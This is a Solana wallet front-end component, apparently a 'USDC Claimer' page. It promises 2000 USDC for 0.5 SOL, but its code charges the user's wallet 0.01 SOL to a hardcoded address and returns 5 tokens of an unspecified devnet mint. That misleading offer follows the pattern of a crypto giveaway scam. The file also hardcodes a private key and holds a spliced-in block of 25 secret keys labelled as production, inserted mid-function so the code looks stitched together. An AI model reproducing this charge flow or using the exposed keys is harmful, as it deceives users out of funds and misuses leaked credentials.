/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2FdjesHuBdX1n2aHzPRLvFixjKfMW5pErgtzfef27a5kroHobg4yYaDrBKsNE2k4DMx4NQtHW78QA85CZW7Lr85C"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "k2eb92uaPHk1e6QLCL7Z8Nujde9jY21zns7toscYsfVGZUBvK6aziof9uz8bs15LsRHhtn9rnWF4Z9KuggsxumN",
  "key1": "3SDxZPRjJwm1wP2KCEko3RycDgDcs47zRRBTgg7L5LjGtHMvi6VZzJXUpjrdGRoVjBYNwoqyvKML7Dxsf39RiA6o",
  "key2": "2heskLLPQjrFzMgPcPK1Wm3mCtpYbokXcHsF9bAUNVZYyy91ovS1rPsuQaNYTYosv11v5T7QznPg2rxe7E3aUKQ6",
  "key3": "5bkTV1FAs48QXB3tBJnyUUF56hzz77L1NqawepWzDU11czazDhZE8Xj9dowAvHHr4MQAmoQUTuJ6D196M7BFAavS",
  "key4": "3fSHhoLFPHACBmzrjuutv33Bk44bg2hUcSCctkf1aTDZ5Lap4ycMt9UoTcZwERnhixcparDCQ79M63uiDMYyiCnH",
  "key5": "z6J2ihWpyJJCgn8kkwwpf6i2T83cd6tybqwL8Y7tqj3J5zEPLmLjLY9GMXHQhCE5axuC4eFdG62958cxugHEMkX",
  "key6": "28L6xpu1UpM9o5pyiKUeYS6AyRinEFo6b26UNV4qDohcWkZLepafbfDZkWvgc9BBStBV2CMb8nPrn5zGG4bCt1gt",
  "key7": "JRbUqfSREAgbF4HXHxQzkJehBoPnmVLBMYrB76BapQkawGA5o3MCvva2qBHUJBxtztiY3EYhQVELB6qiY5Ehyg2",
  "key8": "3MfoXJjbm5F9jw4MAKSJegiPKK5ojZxpGKgE1ARDCrfch8eW5dQ9LrFYYMsbs7gZjtoNWoq8T2hpkMyPyoLzr1Cm",
  "key9": "4UVwK78v1SFjJyKetf8qYbeM8mr1nHcm13sQwrU9QvBhTgtK12i5DQNb2EunXZmATiRQkWiPCShhYHT9TZdWDTiC",
  "key10": "2JH7hKoPDFT3vh72LpLucvP6g7D3Pw1nT5SeKfUHKpkYLiXKVZ6xPuAa1uDyJd3qpGewyfKmMdi1tgPQSdBUGTMm",
  "key11": "tYhYzv1tZugy9gmJBK3NMGZ3k16eGVtPMsoqY5SZy5qWjsHbfwtsZsoV67UdJ9eXv6ctnSkp6Z5XoyXiX4Cgdnp",
  "key12": "4kLdYL1366T5HdZcMhpc5TcTzineefojn8u93xjFPWp6i3vEfhPp5v6V95ayXCwnFvk4YsLceWriFRtLGmiXQDqo",
  "key13": "3qtqAMEuuQhZNwBckVMB5sDaWU7GQZStHWC4BEAPSwB9Vu8NFxrzrU544o5T7kNk5XEVDzFWNKEj2rjX97axxWfY",
  "key14": "2oQ8m8BMFXdgmwsEWqVasH9qCUsAnueYDi58k93FtkhGaR9Rm2RnYSPgJqwHiqwgLueUQGxyLw6HpiGWrJ1kNt5P",
  "key15": "3HinGkP1rxtT8y3MivRXCZS21vjCdgg6k5e5y88J2zf2vDLrqbtFszpa7zBhdPeLi9yLtMCZ7sQPzbkMXtJQbQ8X",
  "key16": "LWTKeUZpeXtt5YRRPjEXNPfpQYSp1XouohvKnuqrBLwP2wsps72QCLq6o8jQBhmP7SV3XXUoSC3fijHZyRoeGy6",
  "key17": "2DP7oBnTPuDRtbArFcZmUwCDaAHJTmzgvEEXJAiLDxDSwkwBnMkADVFhdkKgSiLpjwoiUYjLLdh7YpAr7pMLr4Xx",
  "key18": "67JZDZrLdW3fjcsDFw2xC93TJVGd5xQySVcnYgNwKZNYT1SVPpCcu3iXWw4BLRn73uXHNzWgQbHGmbXormu8P4eC",
  "key19": "298v322kdR51BZH2nQDfumPhySFgzYDe7zoiQmDvvaQ3mNPGPRPDKRcrvTpUQFtdDX1aYkpm51bfm3Q7JX7zyNq8",
  "key20": "5eFMXQCcZyTiqH1XFrK2cjsUvJMcv6cYbpeDTGBxMfcjE3aVegAWFk587qrUtz16BpCphKy3ARGbFfKEPkD3MWSz",
  "key21": "5sZPNcN6SG2BQs3cD5sttK5ZW8SkoLYw1jf85hcVU2royMTgGmt6D7isiWqghLzuuHfPLe47H4YKWTJUtMmSNgE6",
  "key22": "pNJ1kLAuaXGjTMUj3emSi1gpXvHTVPfSAauyp8wcVgeE5MEGTmMQ3Vu6itTnZUBu7ojuzox3DNtrCU4fZdGr9bv",
  "key23": "3FhQ7RUBQCMGDUGiMPWBEt3NRrL6D5y4ZG9XXg3FYRqrBYDCouMLHyYsQzW6WueVssKfRZtzirT9vbdKrK7oAZhd",
  "key24": "4KGbDzpy4aQT6KGQNDWnTgxe5MkAMRfApA6uebnMzw8eqsRx12uKfRovnUAhYZ7DYRyQxMpgPh3TuZLCUgj7Fxpb"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
